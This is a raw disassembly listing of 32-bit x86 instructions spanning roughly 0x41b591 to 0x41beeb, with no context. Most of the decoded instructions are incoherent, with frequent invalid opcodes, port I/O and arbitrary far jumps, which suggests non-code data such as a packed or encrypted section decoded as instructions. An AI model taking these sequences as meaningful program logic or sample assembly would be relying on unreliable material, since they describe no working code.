  41b591:	test   dh,dl
  41b593:	adc    al,0x23
  41b595:	lods   eax,DWORD PTR ds:[esi]
  41b596:	aam    0x3a
  41b598:	test   ebp,ebp
  41b59a:	or     dl,BYTE PTR [esi-0x71a69571]
  41b5a0:	aam    0xd2
  41b5a2:	(bad)  
  41b5a3:	xchg   ebx,eax
  41b5a4:	shl    BYTE PTR [esp+eax*8+0x59],1
  41b5a8:	fwait
  41b5a9:	sbb    al,0x9
  41b5ab:	out    dx,eax
  41b5ac:	cwde   
  41b5ad:	fsub   DWORD PTR [edi-0x3923229b]
  41b5b3:	ret    0x3e1f
  41b5b6:	and    DWORD PTR [edi],esi
  41b5b8:	add    ah,BYTE PTR [edx]
  41b5ba:	dec    esp
  41b5bb:	inc    ebx
  41b5bc:	jle    0x41b617
  41b5be:	fadd   DWORD PTR [eax]
  41b5c0:	aad    0x8a
  41b5c2:	les    edi,FWORD PTR [esi-0x7a]
  41b5c5:	xchg   ecx,eax
  41b5c6:	or     ebx,DWORD PTR [ebx]
  41b5c8:	and    BYTE PTR [ebx-0x58],cl
  41b5cb:	push   ebp
  41b5cc:	inc    esi
  41b5cd:	imul   eax,DWORD PTR [edx+0x34fcc4a9],0x60f2eb2b
  41b5d7:	push   ebx
  41b5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5d9:	lods   eax,DWORD PTR ds:[esi]
  41b5da:	sbb    DWORD PTR [ecx],eax
  41b5dc:	xor    DWORD PTR [ecx-0x56],ebp
  41b5df:	test   DWORD PTR ds:0x746a1a,eax
  41b5e5:	mov    edx,0x27e195eb
  41b5ea:	popf   
  41b5eb:	jecxz  0x41b599
  41b5ed:	mov    ecx,DWORD PTR [edx-0x3]
  41b5f0:	mov    gs,WORD PTR [eax]
  41b5f2:	inc    esi
  41b5f3:	into   
  41b5f4:	in     eax,dx
  41b5f5:	(bad)  
  41b5f6:	fidiv  WORD PTR [ebp+0x1d9ca3f3]
  41b5fc:	or     al,0xdd
  41b5fe:	or     ebx,eax
  41b600:	ror    BYTE PTR [ebx-0x2e],1
  41b603:	mov    ah,0xbe
  41b605:	adc    edx,esp
  41b607:	mov    esp,0x393bab5
  41b60c:	arpl   WORD PTR [esi+0x572e3ac6],cx
  41b612:	mov    ax,ds:0xb7883b3c
  41b618:	retf   
  41b619:	aad    0xcd
  41b61b:	rcr    cl,1
  41b61d:	leave  
  41b61e:	mov    bl,0x4a
  41b620:	out    0xe1,al
  41b622:	cmp    BYTE PTR [esi+edi*4],dl
  41b625:	xchg   edi,eax
  41b626:	(bad)  
  41b627:	loope  0x41b66e
  41b629:	stos   DWORD PTR es:[edi],eax
  41b62a:	jecxz  0x41b689
  41b62c:	dec    ebx
  41b62d:	bnd jae 0x41b622
  41b630:	retf   
  41b631:	ins    DWORD PTR es:[edi],dx
  41b632:	mov    WORD PTR [esi+0x4],?
  41b635:	xor    al,0x4b
  41b637:	fucomip st,st(2)
  41b639:	ds add al,0xe
  41b63c:	dec    esp
  41b63d:	add    edi,DWORD PTR [ecx+eax*8-0x4cea70a9]
  41b644:	rcl    BYTE PTR [edi+0x22ba0176],cl
  41b64a:	je     0x41b5e0
  41b64c:	out    dx,al
  41b64d:	int    0x16
  41b64f:	leave  
  41b650:	mov    cl,0xa9
  41b652:	xor    eax,0xb55e3874
  41b657:	sub    BYTE PTR [ebx*4-0x30cea377],al
  41b65e:	pop    ebx
  41b65f:	push   edx
  41b660:	in     al,0xfc
  41b662:	xchg   esp,eax
  41b663:	mov    ebp,0x81a92d86
  41b668:	data16 lods al,BYTE PTR ds:[esi]
  41b66a:	ja     0x41b66a
  41b66c:	in     al,0x7e
  41b66e:	iret   
  41b66f:	push   0xffffff80
  41b671:	outs   dx,BYTE PTR ds:[esi]
  41b672:	adc    edi,edi
  41b674:	mov    al,0x14
  41b676:	xchg   edi,eax
  41b677:	jge    0x41b5fa
  41b679:	xchg   esi,eax
  41b67a:	adc    esi,DWORD PTR [esi]
  41b67c:	mov    edi,0x22977f45
  41b681:	das    
  41b682:	out    0x34,eax
  41b684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b685:	gs out 0x30,eax
  41b688:	mov    eax,0x47be9bca
  41b68d:	xchg   edx,eax
  41b68e:	xor    DWORD PTR [eax+0x0],ebp
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	adc    eax,0x1c04aa8d
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR [ecx+eax*1],al
  41b70a:	add    BYTE PTR [eax],al
  41b70c:	dec    esi
  41b70d:	fidiv  DWORD PTR [edi-0x13822634]
  41b713:	dec    eax
  41b714:	dec    edx
  41b715:	dec    DWORD PTR [ebx]
  41b717:	mov    BYTE PTR [esi],bh
  41b719:	sub    BYTE PTR [ebx],0x94
  41b71c:	adc    bh,BYTE PTR [ebx]
  41b71e:	or     al,0xb9
  41b720:	push   ss
  41b721:	xor    al,0x12
  41b723:	xchg   esp,eax
  41b724:	adc    al,0xf4
  41b726:	scas   eax,DWORD PTR es:[edi]
  41b727:	paddusw mm1,mm7
  41b72a:	bound  ebp,QWORD PTR [esp+edx*8]
  41b72d:	fs mov dl,0xa0
  41b730:	dec    esp
  41b731:	fiadd  DWORD PTR [ecx+0x4d35cbb5]
  41b737:	pushf  
  41b738:	loop   0x41b7a8
  41b73a:	hlt    
  41b73b:	scas   al,BYTE PTR es:[edi]
  41b73c:	cmp    ebp,DWORD PTR [ebx-0x4c119ce8]
  41b742:	lds    ebp,FWORD PTR [edx]
  41b744:	jno    0x41b6d0
  41b746:	push   ebp
  41b747:	xor    eax,0xff099229
  41b74c:	retf   
  41b74d:	test   eax,0x486af02f
  41b752:	xor    al,0xfa
  41b754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b755:	aad    0xd0
  41b757:	ins    BYTE PTR es:[edi],dx
  41b758:	not    BYTE PTR [esi+0x5a]
  41b75b:	add    DWORD PTR [ecx-0x75d74805],edx
  41b761:	xchg   ebp,eax
  41b762:	adc    DWORD PTR [esi],esp
  41b764:	xor    eax,0x8c7e5dda
  41b769:	push   ss
  41b76a:	sbb    dh,BYTE PTR [eax]
  41b76c:	jbe    0x41b7e1
  41b76e:	sub    esi,0xb3c59a3d
  41b774:	sub    cl,ah
  41b776:	jno    0x41b7ba
  41b778:	(bad)
  41b77c:	rcr    DWORD PTR [ebp-0xf7b84fb],1
  41b782:	pop    ebx
  41b783:	ret    
  41b784:	mov    bh,0x7f
  41b786:	mov    eax,0x9c2559c9
  41b78b:	xor    al,0x6c
  41b78d:	dec    ebp
  41b78e:	das    
  41b78f:	test   eax,0x4463a675
  41b794:	test   eax,0x28e85c6a
  41b799:	fcmovnbe st,st(5)
  41b79b:	pop    ecx
  41b79c:	xchg   ebx,eax
  41b79d:	push   ebp
  41b79e:	mov    edx,0x68c34cb
  41b7a3:	push   esi
  41b7a4:	pop    ss
  41b7a5:	jno    0x41b811
  41b7a7:	das    
  41b7a8:	std    
  41b7a9:	fucomip st,st(1)
  41b7ab:	lahf   
  41b7ac:	daa    
  41b7ad:	mov    WORD PTR [ebx+0x5044304c],cs
  41b7b3:	jp     0x41b753
  41b7b5:	cs stos DWORD PTR es:[edi],eax
  41b7b7:	(bad)  
  41b7b8:	(bad)  
  41b7b9:	cs mov edi,ebp
  41b7bc:	retf   
  41b7bd:	iret   
  41b7be:	xor    edx,DWORD PTR [esi-0x28]
  41b7c1:	pop    esp
  41b7c2:	mov    es,WORD PTR [edi+0x3ed84564]
  41b7c8:	fcom   DWORD PTR [eax-0x3218aabd]
  41b7ce:	ds jb  0x41b849
  41b7d1:	jno    0x41b764
  41b7d3:	jnp    0x41b755
  41b7d5:	mov    esi,DWORD PTR [ebx]
  41b7d7:	mov    ah,0xaf
  41b7d9:	pmaxub mm1,QWORD PTR [ebx-0x68]
  41b7dd:	jecxz  0x41b7a3
  41b7df:	iret   
  41b7e0:	shl    BYTE PTR [eax],1
  41b7e2:	xor    DWORD PTR ds:0x2bf5feaf,0x4c
  41b7e9:	addr16 inc ecx
  41b7eb:	test   al,0xb6
  41b7ed:	mov    ?,WORD PTR [eax]
  41b7ef:	mov    eax,0xa88b9901
  41b7f4:	repz mov cl,0x4
  41b7f7:	push   edi
  41b7f8:	push   esp
  41b7f9:	jno    0x41b872
  41b7fb:	add    DWORD PTR [eax-0x3c77475d],edi
  41b801:	jmp    0xfbfd:0x4f180236
  41b808:	push   esp
  41b809:	pop    dx
  41b80b:	mov    bh,0xb4
  41b80d:	sub    eax,0x1b3a
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x87
  41b881:	ret    
  41b882:	inc    esp
  41b883:	xchg   BYTE PTR [eax],ah
  41b885:	and    al,0x1
  41b887:	add    BYTE PTR [ecx+eax*1],al
  41b88a:	add    BYTE PTR [eax],al
  41b88c:	test   eax,0xd4416c1e
  41b891:	out    dx,al
  41b892:	scas   al,BYTE PTR es:[edi]
  41b893:	push   edi
  41b894:	je     0x41b86d
  41b896:	fbstp  TBYTE PTR es:[eax-0x3b]
  41b89a:	(bad)  [ebx+0x78]
  41b89d:	pop    esi
  41b89e:	mov    DWORD PTR [ebp*8-0x7540b5e7],0xc06f6a00
  41b8a9:	and    ebx,ebp
  41b8ab:	leave  
  41b8ac:	in     al,0x3b
  41b8ae:	mov    ecx,0x18dd5554
  41b8b3:	push   esi
  41b8b4:	in     eax,0x46
  41b8b6:	(bad)  
  41b8b8:	pop    esi
  41b8b9:	mov    BYTE PTR [edx-0x18ef8bd4],bl
  41b8bf:	xor    al,0xd5
  41b8c1:	lahf   
  41b8c2:	jnp    0x41b922
  41b8c4:	xchg   esi,esi
  41b8c6:	pop    eax
  41b8c7:	call   0xde05:0xfda221d5
  41b8ce:	inc    ebx
  41b8cf:	inc    edi
  41b8d0:	dec    ecx
  41b8d1:	repnz xchg edi,eax
  41b8d3:	xchg   esi,eax
  41b8d4:	push   esi
  41b8d5:	fisub  DWORD PTR [edi-0x3c45eb33]
  41b8db:	fcomp  DWORD PTR [edx]
  41b8dd:	jbe    0x41b885
  41b8df:	jge    0x41b886
  41b8e1:	dec    ebp
  41b8e2:	add    al,0xa3
  41b8e4:	adc    ah,BYTE PTR [eax+eiz*2-0x2ec27d92]
  41b8eb:	dec    edi
  41b8ec:	repnz push ss
  41b8ee:	jno    0x41b8cb
  41b8f0:	js     0x41b93b
  41b8f2:	fidiv  WORD PTR [esi+0x30]
  41b8f5:	sti    
  41b8f6:	pop    ecx
  41b8f7:	add    BYTE PTR ds:0x2be9bd5,cl
  41b8fd:	pop    edx
  41b8fe:	xor    al,0xea
  41b900:	sbb    DWORD PTR [esi],ebx
  41b902:	dec    edi
  41b903:	mov    dh,0xc5
  41b905:	dec    eax
  41b906:	std    
  41b907:	fst    DWORD PTR [ecx+0x35]
  41b90a:	jle    0x41b8de
  41b90c:	xor    al,0xfb
  41b90e:	xor    al,BYTE PTR [edx-0x2a5cd945]
  41b914:	xor    ah,BYTE PTR [eax+0x76cfcb56]
  41b91a:	xor    al,0xfd
  41b91c:	popf   
  41b91d:	or     BYTE PTR [eax+0x32],0x97
  41b921:	pop    esi
  41b922:	mov    al,0xda
  41b924:	xchg   esp,eax
  41b925:	push   esp
  41b926:	and    al,dh
  41b928:	icebp  
  41b929:	dec    edx
  41b92a:	add    BYTE PTR [ecx-0x693b8b8a],0xa3
  41b931:	mov    eax,ds:0x2764e146
  41b936:	sti    
  41b937:	push   es
  41b938:	cmp    eax,0x1070015a
  41b93d:	mov    ds:0x13d8a2fc,eax
  41b942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b943:	or     al,0x52
  41b945:	jl     0x41b90f
  41b947:	loop   0x41b93a
  41b949:	mov    cl,0xeb
  41b94b:	jmp    0x30bfd17e
  41b950:	sub    DWORD PTR [ebp-0x52],0x2a
  41b954:	mov    gs,WORD PTR [esi+0x15b7e0e3]
  41b95a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b95b:	add    bl,0x47
  41b95e:	mov    DWORD PTR [edi],ebp
  41b960:	bound  eax,QWORD PTR [eax-0x70]
  41b963:	cmp    ch,BYTE PTR [ecx]
  41b965:	loopne 0x41b94c
  41b967:	shl    DWORD PTR [edx-0x3d],0x1d
  41b96b:	push   ebx
  41b96c:	call   0xb33bc0ff
  41b971:	mov    eax,ds:0x58ee9357
  41b976:	jb     0x41b976
  41b978:	aaa    
  41b979:	mov    ebx,0x1e677d75
  41b97e:	pusha  
  41b97f:	and    edx,esi
  41b981:	push   ecx
  41b982:	push   ss
  41b983:	mov    ch,0xfb
  41b985:	cmp    cl,BYTE PTR [edx]
  41b987:	aad    0xfc
  41b989:	jp     0x41b982
  41b98b:	shl    DWORD PTR [eax+0x35],1
  41b98e:	ret    0x75
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	fstp   TBYTE PTR [edx]
  41ba02:	iret   
  41ba03:	push   edi
  41ba04:	and    al,0x25
  41ba06:	add    DWORD PTR [eax],eax
  41ba08:	add    al,0x1
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	cld    
  41ba0d:	pop    eax
  41ba0e:	clc    
  41ba0f:	jge    0x41ba41
  41ba11:	leave  
  41ba12:	ret    0xacec
  41ba15:	mov    ds:0x24c48c3a,al
  41ba1a:	jle    0x41ba68
  41ba1c:	lods   al,BYTE PTR es:[esi]
  41ba1e:	inc    esp
  41ba1f:	jmp    0x48b05e7c
  41ba24:	js     0x41b9d5
  41ba26:	add    BYTE PTR [ebp-0x14],bh
  41ba29:	test   eax,0xa5c2512b
  41ba2e:	jno    0x41ba39
  41ba30:	xor    ebp,DWORD PTR [edx]
  41ba32:	push   ss
  41ba33:	xor    al,0x61
  41ba35:	xchg   esp,eax
  41ba36:	out    dx,eax
  41ba37:	sub    eax,0xb35144ec
  41ba3c:	and    BYTE PTR [eax+0x1105c59a],al
  41ba42:	fidiv  DWORD PTR [ecx+0x42]
  41ba45:	xchg   ebx,eax
  41ba46:	jns    0x41bac5
  41ba48:	(bad)  
  41ba49:	xor    eax,esp
  41ba4b:	add    dh,BYTE PTR [eax-0x20774fc7]
  41ba51:	lock sub BYTE PTR [ecx+0x5d422c59],bl
  41ba58:	scas   al,BYTE PTR es:[edi]
  41ba59:	push   ss
  41ba5a:	cs or  al,0xab
  41ba5d:	jmp    0x41ba9a
  41ba5f:	(bad)  
  41ba60:	mov    ds:0xc68055f3,eax
  41ba65:	or     eax,0x56deb03f
  41ba6a:	loope  0x41ba2c
  41ba6c:	es sti 
  41ba6e:	push   eax
  41ba6f:	(bad)  
  41ba70:	nop
  41ba71:	push   ebx
  41ba72:	and    ebp,DWORD PTR [edx+0x15]
  41ba75:	shr    bh,cl
  41ba77:	add    ch,BYTE PTR [ecx+edi*2+0x6f]
  41ba7b:	mov    ecx,DWORD PTR [esi-0x70]
  41ba7e:	dec    eax
  41ba7f:	imul   esi,DWORD PTR ds:0x4f0eeadf,0x18
  41ba86:	pop    ds
  41ba87:	fucomip st,st(4)
  41ba89:	fidiv  DWORD PTR [eax-0x3a7140fa]
  41ba8f:	in     eax,dx
  41ba90:	sbb    DWORD PTR [edx-0x2e156c79],0xedd3bcbc
  41ba9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba9b:	mov    edx,0x60bb8958
  41baa1:	outs   dx,DWORD PTR ds:[esi]
  41baa2:	cmp    eax,0xfec71f79
  41baa7:	test   BYTE PTR [esi],bh
  41baa9:	jge    0x41baa5
  41baab:	push   esp
  41baac:	inc    esi
  41baad:	push   esp
  41baae:	shl    ch,cl
  41bab0:	fcomi  st,st(0)
  41bab2:	lea    esi,[edx+0x2]
  41bab5:	lea    ecx,[esi]
  41bab7:	and    DWORD PTR [ebx-0x18],0xa3e2139a
  41babe:	push   cs
  41babf:	repnz fsin 
  41bac2:	mov    bl,0x60
  41bac4:	retf   0x1c61
  41bac7:	pop    esi
  41bac8:	or     al,0x7c
  41baca:	push   esi
  41bacb:	(bad)  
  41bacc:	not    BYTE PTR [ebx-0x44]
  41bacf:	mov    WORD PTR [ebx],ss
  41bad1:	jg     0x41bb50
  41bad3:	sub    ch,BYTE PTR [esi]
  41bad5:	inc    esi
  41bad6:	mov    bh,0x5f
  41bad8:	add    ah,0x7b
  41badb:	popf   
  41badc:	sti    
  41badd:	rcr    BYTE PTR [esi-0x5c],0x9
  41bae1:	enter  0xc63b,0x3d
  41bae5:	xchg   ecx,eax
  41bae6:	and    BYTE PTR [esi+0x7c],ch
  41bae9:	je     0x41bafb
  41baeb:	out    dx,eax
  41baec:	scas   al,BYTE PTR es:[edi]
  41baed:	fadd   QWORD PTR fs:[edx]
  41baf0:	int3   
  41baf1:	leave  
  41baf2:	sbb    cl,BYTE PTR [ecx]
  41baf4:	push   ecx
  41baf5:	xchg   ebp,eax
  41baf6:	sar    DWORD PTR [edx-0x77],cl
  41baf9:	push   esp
  41bafa:	adc    dh,BYTE PTR [eax-0x43]
  41bafd:	sahf   
  41bafe:	aas    
  41baff:	cld    
  41bb00:	es cmc 
  41bb02:	scas   al,BYTE PTR es:[edi]
  41bb03:	stc    
  41bb04:	mov    bh,0x13
  41bb06:	mov    ds:0xcc002729,eax
  41bb0b:	nop
  41bb0c:	xchg   ebp,eax
  41bb0d:	(bad)  
  41bb0e:	shl    BYTE PTR [ecx+0x0],cl
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x5c],cx
  41bb81:	dec    eax
  41bb82:	pop    eax
  41bb83:	popf   
  41bb84:	sub    BYTE PTR [esi],ah
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	cmp    DWORD PTR [ebx],ebp
  41bb8e:	ret    0x151f
  41bb91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb92:	and    DWORD PTR [eax-0x36],0xffffff94
  41bb96:	xor    dh,al
  41bb98:	inc    edx
  41bb99:	cli    
  41bb9a:	sbb    dh,BYTE PTR [ebx+0x1f]
  41bb9d:	fmul   st(7),st
  41bb9f:	mov    al,0x2a
  41bba1:	pop    edx
  41bba2:	mov    bl,0x75
  41bba4:	(bad)  
  41bba5:	jnp    0x41bc17
  41bba7:	call   0xd3c3b1b
  41bbac:	cmp    bl,BYTE PTR [ecx-0x39]
  41bbaf:	fs adc al,0xf8
  41bbb2:	ret    0x856b
  41bbb5:	retf   0x5f95
  41bbb8:	push   eax
  41bbb9:	lds    ecx,FWORD PTR [ecx]
  41bbbb:	inc    ecx
  41bbbc:	dec    ebx
  41bbbd:	jge    0x41bc09
  41bbbf:	pop    edx
  41bbc0:	fs xchg ecx,eax
  41bbc2:	pop    ebp
  41bbc3:	xor    al,0xda
  41bbc5:	mov    ecx,0xd28f7619
  41bbca:	sbb    DWORD PTR [esi+0x38e68a95],esp
  41bbd0:	sub    eax,DWORD PTR [ebx-0x14]
  41bbd3:	icebp  
  41bbd4:	inc    edx
  41bbd5:	(bad)  
  41bbd6:	cli    
  41bbd7:	add    cl,dh
  41bbd9:	imul   ecx,DWORD PTR [esi],0x169a872b
  41bbdf:	test   al,0x5f
  41bbe1:	and    eax,0xb7a53e21
  41bbe6:	fwait
  41bbe7:	clc    
  41bbe8:	pop    ebp
  41bbe9:	xchg   esp,eax
  41bbea:	pop    es
  41bbeb:	adc    ecx,0x341ceab5
  41bbf1:	cdq    
  41bbf2:	pop    ecx
  41bbf3:	enter  0x749b,0x1d
  41bbf7:	ret    0x7f4e
  41bbfa:	inc    ecx
  41bbfb:	cli    
  41bbfc:	jbe    0x41bc56
  41bbfe:	loopne 0x41bc0d
  41bc00:	lock sbb esp,edx
  41bc03:	sbb    BYTE PTR [ecx+0x13],ah
  41bc06:	and    ecx,DWORD PTR [edx-0x56]
  41bc09:	jbe    0x41bc0e
  41bc0b:	aaa    
  41bc0c:	add    BYTE PTR [edx-0x5e],bh
  41bc0f:	mov    WORD PTR [ecx-0x80],fs
  41bc12:	pop    ss
  41bc13:	fldcw  WORD PTR [ebp-0x5d]
  41bc16:	pop    esi
  41bc17:	adc    BYTE PTR [ecx+0x65],cl
  41bc1a:	in     al,dx
  41bc1b:	pop    edi
  41bc1c:	mov    al,ds:0x8b6a6abf
  41bc21:	jns    0x41bc42
  41bc23:	jae    0x41bbd9
  41bc25:	mov    ch,0xb7
  41bc27:	mov    ds:0x2537fcd6,eax
  41bc2c:	clc    
  41bc2d:	add    ch,BYTE PTR [edi+0x36]
  41bc30:	(bad)  
  41bc31:	ror    dh,0xe1
  41bc34:	adc    edx,ebp
  41bc36:	icebp  
  41bc37:	inc    ecx
  41bc38:	outs   dx,DWORD PTR ds:[esi]
  41bc39:	cmc    
  41bc3a:	lea    ebx,[edi-0x3]
  41bc3d:	jmp    0xb1cf:0x7bcbc8b4
  41bc44:	push   eax
  41bc45:	in     eax,0xf8
  41bc47:	div    DWORD PTR [edx+0x4799600]
  41bc4d:	je     0x41bc3a
  41bc4f:	add    BYTE PTR [esi],bl
  41bc51:	xor    cl,BYTE PTR ss:0xa028cec1
  41bc58:	(bad)  
  41bc59:	into   
  41bc5a:	xchg   edi,eax
  41bc5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc5c:	nop
  41bc5d:	or     DWORD PTR [esi],esp
  41bc5f:	push   ebx
  41bc60:	mov    ecx,DWORD PTR [ecx-0x26]
  41bc63:	outs   dx,BYTE PTR ds:[esi]
  41bc64:	daa    
  41bc65:	and    dh,BYTE PTR [eax+0x5c]
  41bc68:	lahf   
  41bc69:	push   ds
  41bc6a:	ret    0xa783
  41bc6d:	shl    DWORD PTR [ecx+0x33e6ec1c],1
  41bc73:	sbb    DWORD PTR [edx],eax
  41bc75:	add    edi,DWORD PTR [eax]
  41bc77:	mov    ebp,0xa80a6292
  41bc7c:	icebp  
  41bc7d:	enter  0xcc2,0x66
  41bc81:	arpl   bx,dx
  41bc83:	push   es
  41bc84:	imul   edi,ebx,0xb
  41bc87:	dec    eax
  41bc88:	push   edi
  41bc89:	aas    
  41bc8a:	inc    eax
  41bc8b:	outs   dx,DWORD PTR ds:[esi]
  41bc8c:	stos   DWORD PTR es:[edi],eax
  41bc8d:	nop
  41bc8e:	pop    ecx
  41bc8f:	sub    eax,DWORD PTR [eax]
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x9ea3d9d8
  41bd02:	mov    ebp,0x1272c01
  41bd07:	add    BYTE PTR [ecx+eax*1],al
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	xchg   edi,eax
  41bd0d:	std    
  41bd0e:	ins    DWORD PTR es:[edi],dx
  41bd0f:	mov    bl,0x9f
  41bd11:	mov    bh,0x69
  41bd13:	push   ecx
  41bd14:	cmp    BYTE PTR [esi-0x4f],0x18
  41bd18:	adc    DWORD PTR [ebp-0x16],edx
  41bd1b:	jp     0x41bd2b
  41bd1d:	out    0xa2,eax
  41bd1f:	xchg   esi,eax
  41bd20:	fisubr DWORD PTR [ecx]
  41bd22:	jge    0x41bd7c
  41bd24:	fisub  WORD PTR [ebp-0x2d477e34]
  41bd2a:	sub    edi,DWORD PTR ds:0x973491d1
  41bd30:	sub    eax,0x1629e885
  41bd35:	xchg   esi,eax
  41bd36:	out    0xfe,eax
  41bd38:	in     al,dx
  41bd39:	repz sub DWORD PTR [edi-0x6b7db889],edi
  41bd40:	sub    esi,DWORD PTR [ebp+0x48cdde18]
  41bd46:	mov    DWORD PTR [ebx],ebx
  41bd48:	sti    
  41bd49:	lss    edi,FWORD PTR es:[ecx+0x5e]
  41bd4e:	push   esp
  41bd4f:	cmp    ecx,ecx
  41bd51:	pop    es
  41bd52:	cli    
  41bd53:	das    
  41bd54:	pop    es
  41bd55:	push   es
  41bd56:	push   ecx
  41bd57:	test   BYTE PTR [eax],cl
  41bd59:	pop    ebp
  41bd5a:	mov    dl,0xad
  41bd5c:	inc    edx
  41bd5d:	into   
  41bd5e:	cmp    bl,dh
  41bd60:	ins    BYTE PTR es:[edi],dx
  41bd61:	mov    cs,esi
  41bd63:	mov    ch,0x9d
  41bd65:	arpl   WORD PTR ds:0xdb9bb11b,di
  41bd6b:	sub    ah,ch
  41bd6d:	repnz dec ebp
  41bd6f:	test   BYTE PTR [eax-0x20],cl
  41bd72:	stos   DWORD PTR es:[edi],eax
  41bd73:	xor    DWORD PTR [edx-0x2c90ec64],esp
  41bd79:	pop    eax
  41bd7a:	mov    BYTE PTR [esi],ah
  41bd7c:	inc    ebp
  41bd7d:	jb     0x41bdc4
  41bd7f:	sub    DWORD PTR [ebx+0x38],esi
  41bd82:	(bad)  
  41bd83:	dec    DWORD PTR [ecx-0x4ebe5d3e]
  41bd89:	ja     0x41bd0b
  41bd8b:	lahf   
  41bd8c:	(bad)  
  41bd8d:	out    0xed,eax
  41bd8f:	pop    ebx
  41bd90:	xchg   BYTE PTR [ecx],bh
  41bd92:	mov    eax,ds:0xef45d4d1
  41bd97:	bound  ecx,QWORD PTR [edi+0x3c]
  41bd9a:	pop    ecx
  41bd9b:	bound  ecx,QWORD PTR [edx]
  41bd9d:	sbb    al,0xcb
  41bd9f:	dec    edx
  41bda0:	fdivp  st(1),st
  41bda2:	retf   0x33ad
  41bda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bda6:	add    eax,ebx
  41bda8:	push   0x49
  41bdaa:	sbb    DWORD PTR [esi+0x1fd94dab],ecx
  41bdb0:	les    ecx,FWORD PTR [edi+0x18]
  41bdb3:	pop    ecx
  41bdb4:	or     dl,BYTE PTR [ecx-0x33]
  41bdb7:	jmp    FWORD PTR [ebp+0x2f06b404]
  41bdbd:	sbb    ecx,DWORD PTR [ecx+0x2]
  41bdc0:	cwde   
  41bdc1:	pop    es
  41bdc2:	sub    DWORD PTR [edx+0x1d],ebx
  41bdc5:	outs   dx,DWORD PTR ds:[esi]
  41bdc6:	(bad)
  41bdca:	push   esp
  41bdcb:	cwde   
  41bdcc:	ror    BYTE PTR [esi+esi*1+0x2d],cl
  41bdd0:	mov    ds:0xeceb0818,al
  41bdd5:	pop    esi
  41bdd6:	repz retf 
  41bdd8:	stos   DWORD PTR es:[edi],eax
  41bdd9:	mov    esi,fs
  41bddb:	into   
  41bddc:	push   ebx
  41bddd:	push   ecx
  41bdde:	repz pushw ds
  41bde1:	pop    ebp
  41bde2:	sahf   
  41bde3:	cmp    eax,0xd78f5c7d
  41bde8:	loopne 0x41bd7e
  41bdea:	lahf   
  41bdeb:	sbb    ch,bl
  41bded:	ret    
  41bdee:	sbb    ebx,DWORD PTR [eax]
  41bdf0:	lahf   
  41bdf1:	mov    ?,esp
  41bdf3:	or     eax,0xcd96d418
  41bdf8:	inc    eax
  41bdf9:	adc    al,cl
  41bdfb:	mov    ebx,0xf3c56d5b
  41be00:	inc    edx
  41be01:	lea    ebx,[esi]
  41be03:	add    al,0x16
  41be05:	sbb    DWORD PTR [edi-0x42],0x958a0814
  41be0c:	mov    dh,0x3d
  41be0e:	into   
  41be0f:	pop    ss
	...
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx+0x68233f66]
  41be82:	int3   
  41be83:	(bad)  
  41be84:	xor    BYTE PTR [eax],ch
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    al,0x1
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	ret    
  41be8d:	into   
  41be8e:	mov    ah,BYTE PTR [edi+0x76]
  41be91:	cld    
  41be92:	call   0x376f6093
  41be97:	mov    ch,0x96
  41be99:	inc    esp
  41be9b:	jns    0x41bef8
  41be9d:	cmp    al,0x52
  41be9f:	dec    ebx
  41bea0:	call   DWORD PTR ss:[esi-0x2d1a6c6e]
  41bea7:	pop    ebp
  41bea8:	das    
  41bea9:	xor    eax,0x207b6b8
  41beae:	xor    edi,DWORD PTR [esi-0x5437f85b]
  41beb4:	adc    ah,BYTE PTR [ebp+0x623f21f1]
  41beba:	fs nop
  41bebc:	mov    DWORD PTR [edx],edi
  41bebe:	cli    
  41bebf:	and    BYTE PTR [eax+0x49393afd],bl
  41bec5:	push   0x35
  41bec7:	pop    es
  41bec8:	test   al,0xc7
  41beca:	push   esi
  41becb:	and    al,0x81
  41becd:	mov    ebx,0x6d6e8269
  41bed2:	cmp    DWORD PTR [eax-0x2c7d7ad5],ebp
  41bed8:	and    dx,sp
  41bedb:	adc    edi,DWORD PTR [esi-0x6ddd1a9a]
  41bee1:	jb     0x41bf03
  41bee3:	sar    BYTE PTR [edx-0x63b0c096],cl
  41bee9:	arpl   di,bx
  41beeb:	es mov ecx,0x57cbc7b8
